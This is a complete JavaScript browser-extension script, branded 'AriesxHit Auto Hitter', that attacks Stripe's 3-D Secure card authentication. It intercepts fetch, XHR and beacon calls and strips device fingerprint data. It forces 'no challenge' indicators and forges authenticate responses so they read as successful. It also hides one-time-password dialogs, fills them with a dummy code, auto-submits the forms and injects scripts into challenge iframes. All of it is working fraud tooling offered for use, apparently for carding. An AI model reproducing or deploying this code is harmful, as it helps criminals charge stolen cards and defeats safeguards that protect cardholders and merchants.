// ARIESXHIT 3DS BYPASS CORE
// Injected directly into page context at document_start
// Based on ABUSE BYPASSER v4.2 logic with AriesxHit integration

(function() {
  'use strict';
  if (window.__ARIES_3DS_CORE__) return;
  window.__ARIES_3DS_CORE__ = true;

  let bypassCount = 0;
  let detectCount = 0;

  // ==================== STRIPE DETECTION ====================
  const STRIPE_DOMAINS = ['stripe.com', 'stripe.network'];
  const STRIPE_PATHS = ['/v1/3ds', '/v1/payment', '/v1/setup', '/v1/tokens', '/v1/sources', '/authenticate', '/confirm', '/challenge'];

  function isStripe(url) {
    if (!url) return false;
    try {
      const u = new URL(url, location.href);
      return STRIPE_DOMAINS.some(d => u.hostname.includes(d)) || STRIPE_PATHS.some(p => u.pathname.includes(p));
    } catch {
      return STRIPE_DOMAINS.some(d => url.includes(d)) || STRIPE_PATHS.some(p => url.includes(p));
    }
  }

  function isCritical(url) {
    if (!url) return false;
    const critical = ['3ds2/authenticate', '3ds2/challenge', 'verify_challenge', 'three_d_secure'];
    return critical.some(c => url.toLowerCase().includes(c));
  }

  // ==================== LOGGING ====================
  function sendLog(type, message, url) {
    const log = { type, message, url: url || window.location.href, time: Date.now() };
    console.log(`%c[3DS-${type.toUpperCase()}] ${message}`, `color: ${type === 'bypass' ? '#22c55e' : type === 'error' ? '#ef4444' : '#888'}; font-weight: bold`);

    // Send to background script
    window.postMessage({
      source: 'aries-3ds-bypass',
      log: log
    }, '*');

    if (type === 'bypass') showSuccessNotification(url);
  }

  // Debug function to log all requests
  function debugRequest(url, method, body, type) {
    console.log(`%c[3DS-DEBUG] ${method} ${url.substring(0, 60)} (${type})`, 'color: #888; font-size: 10px');
    if (body && body.length < 500) {
      console.log(`%c[3DS-DEBUG] Body: ${body.substring(0, 200)}...`, 'color: #666; font-size: 10px');
    }
  }

  // ==================== SUCCESS NOTIFICATION ====================
  function showSuccessNotification(url) {
    if (!document.body) return;

    const old = document.getElementById('aries-3ds-success');
    if (old) old.remove();

    const popup = document.createElement('div');
    popup.id = 'aries-3ds-success';
    popup.setAttribute('style', 'position:fixed;top:20px;right:20px;width:280px;background:#1a1625;border:2px solid #22c55e;border-radius:12px;padding:16px;z-index:2147483647;font-family:system-ui,sans-serif;box-shadow:0 10px 40px rgba(0,0,0,0.8);opacity:0;transform:translateY(-20px);transition:all 0.3s ease');

    const header = document.createElement('div');
    header.setAttribute('style', 'display:flex;align-items:center;gap:12px;margin-bottom:12px');

    const icon = document.createElement('div');
    icon.setAttribute('style', 'width:40px;height:40px;background:#22c55e;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:20px;color:white');
    icon.textContent = '✓';

    const titleBox = document.createElement('div');
    const title = document.createElement('div');
    title.setAttribute('style', 'color:#22c55e;font-size:15px;font-weight:700');
    title.textContent = '3DS BYPASSED!';
    const sub = document.createElement('div');
    sub.setAttribute('style', 'color:#666;font-size:11px');
    sub.textContent = 'AriesxHit Auto Hitter';
    titleBox.appendChild(title);
    titleBox.appendChild(sub);

    header.appendChild(icon);
    header.appendChild(titleBox);

    const urlBox = document.createElement('div');
    urlBox.setAttribute('style', 'background:#0a0a0a;padding:10px;border-radius:8px;color:#888;font-size:10px;font-family:monospace;word-break:break-all;max-height:50px;overflow:hidden');
    urlBox.textContent = url ? url.substring(0, 80) : '3DS Request bypassed';

    const bar = document.createElement('div');
    bar.setAttribute('style', 'height:3px;background:#22c55e;margin-top:12px;border-radius:2px;width:100%;transition:width 5s linear');

    popup.appendChild(header);
    popup.appendChild(urlBox);
    popup.appendChild(bar);
    document.body.appendChild(popup);

    setTimeout(() => { popup.style.opacity = '1'; popup.style.transform = 'translateY(0)'; }, 50);
    setTimeout(() => { bar.style.width = '0%'; }, 100);
    setTimeout(() => { popup.style.opacity = '0'; popup.style.transform = 'translateY(-20px)'; setTimeout(() => popup.remove(), 300); }, 5000);
  }

  // ==================== CORE BYPASS LOGIC ====================
  function decodeAndModify(bodyStr) {
    if (!bodyStr) return { modified: false, body: bodyStr };

    let result = bodyStr;
    let modified = false;

    // Pattern 1: Direct locale strings (case insensitive)
    const localePatterns = [
      /en-US/gi, /en_US/gi, /en-GB/gi, /en_GB/gi,
      /"locale":"[^"]*"/gi,
      /"browser_locale":"[^"]*"/gi,
      /"language":"[^"]*"/gi,
      /locale=[^&]*/gi,
      /browser_locale=[^&]*/gi
    ];

    for (const p of localePatterns) {
      const before = result;
      result = result.replace(p, '');
      if (before !== result) modified = true;
    }

    // Pattern 2: URL-encoded base64 in three_d_secure[device_data]
    const deviceDataMatch = result.match(/three_d_secure%5Bdevice_data%5D=([^&]*)/);
    if (deviceDataMatch) {
      console.log('[3DS] Found device_data parameter, processing...');
      try {
        let encoded = deviceDataMatch[1];
        console.log('[3DS] Encoded data:', encoded.substring(0, 50) + '...');

        let decoded = decodeURIComponent(encoded);
        console.log('[3DS] URL decoded data:', decoded.substring(0, 50) + '...');

        let json = atob(decoded);
        console.log('[3DS] Base64 decoded JSON:', json.substring(0, 100) + '...');

        let obj = JSON.parse(json);
        console.log('[3DS] Parsed object keys:', Object.keys(obj));

        // Remove browser fingerprints (exactly as in user's code)
        delete obj.browser_locale;
        delete obj.timezone;
        delete obj.user_agent;
        delete obj.screen_width;
        delete obj.screen_height;
        delete obj.color_depth;

        // Also remove locale and language if present
        delete obj.locale;
        delete obj.language;

        console.log('[3DS] After removal, object keys:', Object.keys(obj));

        // Re-encode exactly as in user's code
        let newJson = JSON.stringify(obj);
        console.log('[3DS] New JSON:', newJson.substring(0, 100) + '...');

        let newBase64 = btoa(newJson);
        console.log('[3DS] New Base64:', newBase64.substring(0, 50) + '...');

        let newEncoded = encodeURIComponent(newBase64);
        console.log('[3DS] New URL encoded:', newEncoded.substring(0, 50) + '...');

        // Replace in request
        result = result.replace(deviceDataMatch[0], `three_d_secure%5Bdevice_data%5D=${newEncoded}`);

        modified = true;
        console.log('[3DS] Successfully modified device_data parameter');

      } catch(e) {
        console.error('[3DS] Error processing device_data:', e);
      }
    }

    // Pattern 3: JSON body modifications
    try {
      if (result.startsWith('{') || result.startsWith('%7B')) {
        let jsonStr = result.startsWith('%') ? decodeURIComponent(result) : result;
        let obj = JSON.parse(jsonStr);

        const removeKeys = ['browser_locale', 'locale', 'language', 'timezone', 'user_agent', 'screen_width', 'screen_height', 'color_depth'];

        function deepRemove(o) {
          if (typeof o !== 'object' || !o) return;
          for (const key of removeKeys) {
            if (key in o) {
              delete o[key];
              modified = true;
            }
          }
          for (const v of Object.values(o)) {
            if (typeof v === 'object') deepRemove(v);
          }
        }

        deepRemove(obj);
        if (modified) {
          result = JSON.stringify(obj);
          if (bodyStr.startsWith('%')) result = encodeURIComponent(result);
        }
      }
    } catch(e) {
      console.log('[3DS] JSON body processing failed:', e.message);
    }

    return { modified, body: result };
  }

  // ==================== 3DS REQUEST MODIFICATION ====================
  function modify3DSAuthenticateRequest(bodyStr) {
    if (!bodyStr) return { modified: false, body: bodyStr };

    let result = bodyStr;
    let modified = false;

    try {
      // Try to parse as JSON
      if (result.startsWith('{') || result.startsWith('%7B')) {
        let jsonStr = result.startsWith('%') ? decodeURIComponent(result) : result;
        let obj = JSON.parse(jsonStr);

        console.log('[3DS] 3DS authenticate request object:', Object.keys(obj));
        console.log('[3DS] Full request object:', JSON.stringify(obj, null, 2));

        // Look for challenge-related parameters
        if (obj.challenge_indicator) {
          console.log('[3DS] Found challenge_indicator:', obj.challenge_indicator);
          // Try to change challenge requirement
          if (obj.challenge_indicator === '01' || obj.challenge_indicator === 'challenge_required') {
            obj.challenge_indicator = '04'; // 04 = challenge not required
            modified = true;
            console.log('[3DS] Changed challenge_indicator to 04 (no challenge)');
          }
        }

        // Look for authentication preferences
        if (obj.authentication_indicator) {
          console.log('[3DS] Found authentication_indicator:', obj.authentication_indicator);
          obj.authentication_indicator = '01'; // 01 = payment transaction
          modified = true;
        }

        // Look for device channel
        if (obj.device_channel) {
          console.log('[3DS] Found device_channel:', obj.device_channel);
          // Keep as is, but log it
        }

        // Look for three_ds_requestor_challenge_ind
        if (obj.three_ds_requestor_challenge_ind) {
          console.log('[3DS] Found three_ds_requestor_challenge_ind:', obj.three_ds_requestor_challenge_ind);
          // 01 = No preference, 02 = No challenge, 03 = Challenge preferred, 04 = Challenge mandated
          if (obj.three_ds_requestor_challenge_ind !== '02') {
            obj.three_ds_requestor_challenge_ind = '02'; // No challenge requested
            modified = true;
            console.log('[3DS] Changed three_ds_requestor_challenge_ind to 02 (no challenge)');
          }
        }

        if (modified) {
          result = JSON.stringify(obj);
          if (bodyStr.startsWith('%')) result = encodeURIComponent(result);
          console.log('[3DS] Successfully modified 3DS authenticate request');
        }
      }

      // Also check URL-encoded parameters
      const params = new URLSearchParams(result);
      let paramsModified = false;

      if (params.has('three_ds_requestor_challenge_ind')) {
        const current = params.get('three_ds_requestor_challenge_ind');
        if (current !== '02') {
          params.set('three_ds_requestor_challenge_ind', '02');
          paramsModified = true;
          console.log('[3DS] Modified URL param three_ds_requestor_challenge_ind to 02');
        }
      }

      if (paramsModified) {
        result = params.toString();
        modified = true;
      }

    } catch (e) {
      console.log('[3DS] Error modifying 3DS authenticate request:', e.message);
    }

    return { modified, body: result };
  }

  // ==================== 3DS RESPONSE MODIFICATION ====================
  function modify3DSResponse(responseText) {
    if (!responseText) return { modified: false, response: responseText };

    let modified = false;
    let result = responseText;

    try {
      // Try to parse as JSON
      if (result.startsWith('{') || result.startsWith('%7B')) {
        let jsonStr = result.startsWith('%') ? decodeURIComponent(result) : result;
        let obj = JSON.parse(jsonStr);

        console.log('[3DS] 3DS response object keys:', Object.keys(obj));

        // Check for 3DS status fields
        if (obj.state) {
          console.log('[3DS] Found state field:', obj.state);
          // Change challenge states to success states
          if (obj.state === 'challenge_required' || obj.state === 'challenge_pending') {
            obj.state = 'challenge_completed';
            modified = true;
            console.log('[3DS] Changed state to challenge_completed');
          }
        }

        if (obj.status) {
          console.log('[3DS] Found status field:', obj.status);
          // Change requiring action to succeeded
          if (obj.status === 'requires_action') {
            obj.status = 'succeeded';
            modified = true;
            console.log('[3DS] Changed status to succeeded');
          }
        }

        // Look for authentication results
        if (obj.authentication_result) {
          console.log('[3DS] Found authentication_result');
          // Modify to indicate successful authentication
          if (obj.authentication_result.status !== 'Y') {
            obj.authentication_result.status = 'Y'; // Y = successful authentication
            obj.authentication_result.description = 'Authentication successful';
            modified = true;
            console.log('[3DS] Modified authentication_result to success');
          }
        }

        // Look for nested challenge data
        function modifyNested(obj) {
          if (typeof obj !== 'object' || !obj) return;

          if (obj.state === 'challenge_required') {
            obj.state = 'challenge_completed';
            modified = true;
          }
          if (obj.status === 'requires_action') {
            obj.status = 'succeeded';
            modified = true;
          }

          // Recursively check nested objects
          Object.values(obj).forEach(val => {
            if (typeof val === 'object') modifyNested(val);
          });
        }

        modifyNested(obj);

        if (modified) {
          result = JSON.stringify(obj);
          if (responseText.startsWith('%')) result = encodeURIComponent(result);
        }
      }

    } catch (e) {
      console.log('[3DS] Error modifying 3DS response:', e.message);
    }

    return { modified, response: result };
  }

  // ==================== REQUEST INTERCEPTION ====================

  // Helper function to convert body to string
  function bodyToString(b) {
    if (!b) return '';
    if (typeof b === 'string') return b;
    if (b instanceof URLSearchParams) return b.toString();
    if (b instanceof FormData) {
      const p = new URLSearchParams();
      b.forEach((v, k) => p.append(k, v));
      return p.toString();
    }
    if (b instanceof ArrayBuffer) return new TextDecoder().decode(b);
    try {
      return JSON.stringify(b);
    } catch (_) {
      return '';
    }
  }

  // ==================== FETCH INTERCEPTION ====================
  const origFetch = window.fetch;

  window.fetch = async function(input, init) {
    let url, method, headers, body;

    if (input instanceof Request) {
      url = input.url;
      method = input.method;
      headers = new Headers(input.headers);
      if (input.body) {
        try { const clone = input.clone(); body = await clone.text(); } catch(e) { body = null; }
      }
    } else {
      url = String(input || '');
      method = init?.method || 'GET';
      headers = init?.headers ? new Headers(init.headers) : new Headers();
      body = init?.body;
    }

    // Convert body to string if needed
    if (body && typeof body !== 'string') {
      body = bodyToString(body);
    }

    // Check if this is a Stripe request that needs bypass
    if (isStripe(url) && body && method !== 'GET') {
      detectCount++;
      debugRequest(url, method, body, 'fetch');

      if (isCritical(url)) {
        sendLog('detect', `★ CRITICAL: ${method} ${url.substring(0, 60)}`, url);
      }

      let result = decodeAndModify(body);

      // Special handling for 3DS authenticate requests
      if (url.includes('/3ds2/authenticate')) {
        console.log('[3DS] Processing 3DS authenticate request');
        console.log('[3DS] Original request body:', body.substring(0, 500) + '...');
        const authResult = modify3DSAuthenticateRequest(body);
        if (authResult.modified) {
          result = authResult;
          console.log('[3DS] Modified 3DS authenticate request - returning modified body');
          console.log('[3DS] Modified request body:', result.body.substring(0, 500) + '...');
        } else {
          console.log('[3DS] 3DS authenticate request was NOT modified');
        }
      }

      if (result.modified) {
        bypassCount++;
        sendLog('bypass', `BYPASSED! Request modified`, url);
        debugRequest(url, method, result.body, 'fetch-modified');

        const newInit = {
          method,
          headers,
          body: result.body,
          credentials: init?.credentials || 'same-origin',
          mode: init?.mode || 'cors'
        };

        // Intercept the response for 3DS authenticate
        const response = await origFetch.call(window, url, newInit);

        if (url.includes('/3ds2/authenticate')) {
          console.log('[3DS] Intercepting 3DS authenticate response');

          // Clone and read the response
          const clonedResponse = response.clone();
          const responseText = await clonedResponse.text();

          console.log('[3DS] Original 3DS response:', responseText.substring(0, 200) + '...');

          // Try to modify the response to indicate success
          const modifiedResponse = modify3DSResponse(responseText);

          if (modifiedResponse.modified) {
            console.log('[3DS] Modified 3DS response:', modifiedResponse.response.substring(0, 200) + '...');

            // Return a new response with modified body
            return new Response(modifiedResponse.response, {
              status: response.status,
              statusText: response.statusText,
              headers: response.headers
            });
          }
        }

        return response;
      }
    }

    if (input instanceof Request) return origFetch.call(window, input, init);
    return origFetch.call(window, url, init || {});
  };

  // ==================== XHR INTERCEPTION ====================
  const XHR = XMLHttpRequest;
  const origOpen = XHR.prototype.open;
  const origSend = XHR.prototype.send;

  XHR.prototype.open = function(method, url) {
    this._ariesUrl = String(url || '');
    this._ariesMethod = method;
    return origOpen.apply(this, arguments);
  };

  XHR.prototype.send = function(body) {
    const url = this._ariesUrl;
    const method = this._ariesMethod;

    if (isStripe(url)) {
      detectCount++;
      debugRequest(url, method, body, 'xhr');

      if (isCritical(url)) sendLog('detect', `★ XHR CRITICAL: ${method} ${url.substring(0, 60)}`, url);

      let bodyStr = body;
      if (body && typeof body !== 'string') {
        bodyStr = bodyToString(body);
      }

      if (bodyStr && method !== 'GET') {
        let result = decodeAndModify(bodyStr);

        // Special handling for 3DS authenticate requests
        if (url.includes('/3ds2/authenticate')) {
          console.log('[3DS] Processing XHR 3DS authenticate request');
          const authResult = modify3DSAuthenticateRequest(bodyStr);
          if (authResult.modified) {
            result = authResult;
            console.log('[3DS] Modified XHR 3DS authenticate request');
          }
        }

        if (result.modified) {
          bypassCount++;
          sendLog('bypass', `XHR BYPASSED!`, url);
          debugRequest(url, method, result.body, 'xhr-modified');

          // Intercept the response for 3DS authenticate
          if (url.includes('/3ds2/authenticate')) {
            console.log('[3DS] Setting up XHR response interception for 3DS authenticate');
            this.addEventListener('load', function() {
              if (this.responseText) {
                console.log('[3DS] Original XHR 3DS response:', this.responseText.substring(0, 200) + '...');

                const modified = modify3DSResponse(this.responseText);
                if (modified.modified) {
                  console.log('[3DS] Modified XHR 3DS response:', modified.response.substring(0, 200) + '...');

                  // Override the responseText
                  Object.defineProperty(this, 'responseText', {
                    writable: true,
                    value: modified.response
                  });

                  // Also override response if it's JSON
                  try {
                    Object.defineProperty(this, 'response', {
                      writable: true,
                      value: modified.response
                    });
                  } catch (e) {}
                }
              }
            });
          }

          return origSend.call(this, result.body);
        }
      }
    }

    return origSend.apply(this, arguments);
  };

  // ==================== BEACON INTERCEPTION ====================
  if (navigator.sendBeacon) {
    const origBeacon = navigator.sendBeacon.bind(navigator);
    navigator.sendBeacon = function(url, data) {
      if (isStripe(url)) {
        let bodyStr = data;
        if (data instanceof URLSearchParams) bodyStr = data.toString();
        else if (data instanceof FormData) {
          const params = new URLSearchParams();
          data.forEach((v, k) => params.append(k, v));
          bodyStr = params.toString();
        }
        else if (typeof data !== 'string') {
          try { bodyStr = JSON.stringify(data); } catch(e) {}
        }

        if (bodyStr) {
          const result = decodeAndModify(bodyStr);
          if (result.modified) {
            bypassCount++;
            sendLog('bypass', `Beacon BYPASSED!`, url);
            return origBeacon(url, result.body);
          }
        }
      }
      return origBeacon(url, data);
    };
  }

  // ==================== ARIESXHIT INTEGRATION ====================

  // Signal to AriesxHit core that 3DS bypass is ready
  window.__ARIES_3DS_READY__ = true;

  // Listen for AriesxHit state updates
  window.addEventListener('message', (event) => {
    if (event.data?.type === 'aries-state-update' && event.data.autoHitActive !== undefined) {
      // Adjust bypass behavior based on auto-hit state
      console.log('[3DS] Auto-hit state changed:', event.data.autoHitActive);
    }
  });

  // ==================== GLOBAL OTP MONITOR ====================

  // Monitor the entire document for OTP-related elements
  const globalObserver = new MutationObserver((mutations) => {
    let foundOTP = false;

    mutations.forEach(mutation => {
      mutation.addedNodes.forEach(node => {
        if (node.nodeType === Node.ELEMENT_NODE) {
          // Check the added element and all its children
          const walker = document.createTreeWalker(node, NodeFilter.SHOW_ELEMENT);
          let currentNode = walker.currentNode;

          while (currentNode) {
            if (isOTPForm(currentNode) && !currentNode.hasAttribute('data-3ds-processed')) {
              console.log('[3DS] Global observer found OTP element');
              currentNode.setAttribute('data-3ds-processed', 'true');
              bypassOTPForm(currentNode);
              foundOTP = true;
            }
            currentNode = walker.nextNode();
          }
        }
      });
    });

    // If we found OTP elements, do an immediate check of all forms
    if (foundOTP) {
      setTimeout(checkForOTPModals, 100);
    }
  });

  globalObserver.observe(document.body, {
    childList: true,
    subtree: true,
    attributes: true,
    attributeFilter: ['class', 'id', 'style']
  });

  // ==================== OTP POPUP BLOCKER ====================
  function blockOTPPopups() {
    console.log('[3DS] Setting up OTP popup blocker');

    // Monitor for new iframes (3DS challenges often appear in iframes)
    const observer = new MutationObserver((mutations) => {
      for (const mutation of mutations) {
        if (mutation.type === 'childList') {
          // Check for new iframes
          mutation.addedNodes.forEach(node => {
            if (node.tagName === 'IFRAME') {
              checkIframeForOTP(node);
            }
          });

          // Check for modal/popups
          checkForOTPModals();
        }
      }
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true
    });

    // Also check periodically
    setInterval(() => {
      checkForOTPModals();
      checkAllIframesForOTP();
    }, 1000);

    // Check existing iframes
    checkAllIframesForOTP();
  }

  function checkIframeForOTP(iframe) {
    try {
      const src = iframe.src || '';
      if (src.includes('3ds') || src.includes('authenticate') || src.includes('challenge')) {
        console.log('[3DS] Found 3DS iframe:', src);

        // Try to inject script into iframe
        setTimeout(() => {
          try {
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            if (iframeDoc) {
              injectOTPBlockerIntoIframe(iframeDoc);
            }
          } catch (e) {
            console.log('[3DS] Could not access iframe content:', e.message);
          }
        }, 2000);
      }
    } catch (e) {
      console.log('[3DS] Error checking iframe:', e.message);
    }
  }

  function checkAllIframesForOTP() {
    const iframes = document.querySelectorAll('iframe');
    iframes.forEach(iframe => checkIframeForOTP(iframe));
  }

  function checkForOTPModals() {
    // Look for common OTP modal selectors
    const otpSelectors = [
      '[class*="challenge"]',
      '[class*="3ds"]',
      '[class*="authenticate"]',
      '[id*="otp"]',
      '[id*="challenge"]',
      '[id*="verification"]',
      'input[placeholder*="OTP" i]',
      'input[placeholder*="code" i]',
      'input[placeholder*="verification" i]',
      'input[name*="otp"]',
      'input[name*="code"]',
      'input[name*="verification"]',
      'input[type="password"]',
      '.modal',
      '.popup',
      '[role="dialog"]',
      '.overlay',
      '.lightbox',
      '[class*="modal"]',
      '[class*="popup"]',
      '[class*="dialog"]'
    ];

    otpSelectors.forEach(selector => {
      const elements = document.querySelectorAll(selector);
      elements.forEach(element => {
        if (isOTPForm(element) && !element.hasAttribute('data-3ds-processed')) {
          console.log('[3DS] Found OTP form/modal, attempting to bypass:', selector);
          element.setAttribute('data-3ds-processed', 'true');
          bypassOTPForm(element);
        }
      });
    });
  }

  function isOTPForm(element) {
    // Check if element contains OTP-related inputs
    const inputs = element.querySelectorAll('input');
    for (const input of inputs) {
      const placeholder = (input.placeholder || '').toLowerCase();
      const name = (input.name || '').toLowerCase();
      const type = (input.type || '').toLowerCase();

      if (placeholder.includes('otp') || placeholder.includes('code') ||
          placeholder.includes('verification') || name.includes('otp') ||
          name.includes('code') || type === 'password') {
        return true;
      }
    }

    // Check element classes/IDs
    const className = (element.className || '').toLowerCase();
    const id = (element.id || '').toLowerCase();

    if (className.includes('challenge') || className.includes('3ds') ||
        className.includes('authenticate') || id.includes('otp') ||
        id.includes('challenge')) {
      return true;
    }

    return false;
  }

  function bypassOTPForm(element) {
    console.log('[3DS] Attempting to bypass OTP form');

    try {
      // Hide the element immediately
      element.style.display = 'none !important';
      element.style.visibility = 'hidden !important';
      element.style.opacity = '0 !important';
      element.style.pointerEvents = 'none !important';
      console.log('[3DS] Immediately hid OTP element');

      // Fill OTP inputs with dummy values
      const inputs = element.querySelectorAll('input');
      inputs.forEach(input => {
        if (input.type === 'password' || input.placeholder.toLowerCase().includes('otp') ||
            input.placeholder.toLowerCase().includes('code') ||
            input.placeholder.toLowerCase().includes('verification') ||
            input.name.toLowerCase().includes('otp') ||
            input.name.toLowerCase().includes('code')) {
          input.value = '123456'; // Common OTP
          input.dispatchEvent(new Event('input', { bubbles: true }));
          input.dispatchEvent(new Event('change', { bubbles: true }));
          console.log('[3DS] Filled OTP input:', input.name || input.placeholder);
        }
      });

      // Try to submit immediately
      const submitButtons = element.querySelectorAll('button, input[type="submit"], [role="button"]');
      submitButtons.forEach(button => {
        if (button.textContent.toLowerCase().includes('submit') ||
            button.textContent.toLowerCase().includes('verify') ||
            button.textContent.toLowerCase().includes('confirm') ||
            button.textContent.toLowerCase().includes('continue') ||
            button.type === 'submit') {
          console.log('[3DS] Clicking submit button:', button.textContent);
          button.click();
        }
      });

      // Submit any forms found
      const forms = element.querySelectorAll('form');
      forms.forEach(form => {
        console.log('[3DS] Submitting form');
        try {
          form.submit();
        } catch (e) {
          console.log('[3DS] Form submit failed:', e.message);
        }
      });

      // Also try parent forms
      const parentForm = element.closest('form');
      if (parentForm) {
        console.log('[3DS] Submitting parent form');
        try {
          parentForm.submit();
        } catch (e) {
          console.log('[3DS] Parent form submit failed:', e.message);
        }
      }

    } catch (e) {
      console.log('[3DS] Error bypassing OTP form:', e.message);
    }
  }

  function injectOTPBlockerIntoIframe(iframeDoc) {
    try {
      const script = iframeDoc.createElement('script');
      script.textContent = `
        // OTP blocker injected into iframe
        function blockOTPInIframe() {
          // Hide OTP forms immediately
          const otpSelectors = [
            'input[placeholder*="OTP" i]',
            'input[placeholder*="code" i]',
            'input[name*="otp"]',
            'input[name*="code"]',
            'form',
            '.challenge-container',
            '.authentication-container'
          ];

          otpSelectors.forEach(selector => {
            const elements = document.querySelectorAll(selector);
            elements.forEach(el => {
              el.style.display = 'none';
              console.log('Hidden OTP element in iframe');
            });
          });

          // Auto-submit any forms
          const forms = document.querySelectorAll('form');
          forms.forEach(form => {
            setTimeout(() => {
              form.submit();
              console.log('Auto-submitted form in iframe');
            }, 100);
          });
        }

        // Run immediately and periodically
        blockOTPInIframe();
        setInterval(blockOTPInIframe, 500);
      `;
      iframeDoc.head.appendChild(script);
      console.log('[3DS] Injected OTP blocker into iframe');
    } catch (e) {
      console.log('[3DS] Could not inject into iframe:', e.message);
    }
  }

  // ==================== STARTUP ====================
  console.log('%c[ARIES 3DS BYPASS] Core loaded and active - Ready to bypass 3DS!', 'color: #22c55e; font-size: 16px; font-weight: bold; background: #000; padding: 10px;');
  console.log('%c[ARIES 3DS BYPASS] Monitoring all network requests for Stripe 3DS data...', 'color: #22c55e; font-size: 12px;');

  // Start OTP popup blocker
  blockOTPPopups();

  // Visual indicator that bypass is loaded
  if (document.body) {
    const indicator = document.createElement('div');
    indicator.id = 'aries-3ds-indicator';
    indicator.textContent = '🛡️ 3DS BYPASS ACTIVE';
    indicator.setAttribute('style', 'position:fixed;bottom:10px;left:10px;background:#22c55e;color:white;padding:5px 10px;border-radius:5px;font-size:10px;z-index:999999;font-family:monospace;opacity:0.8;');
    document.body.appendChild(indicator);
    setTimeout(() => indicator.remove(), 3000); // Remove after 3 seconds
  }

  sendLog('info', 'ARIES 3DS BYPASS v1.0 - Ready', window.location.href);

  // Expose stats for debugging
  window.__ARIES_3DS_STATS__ = () => ({ bypassed: bypassCount, detected: detectCount });

})();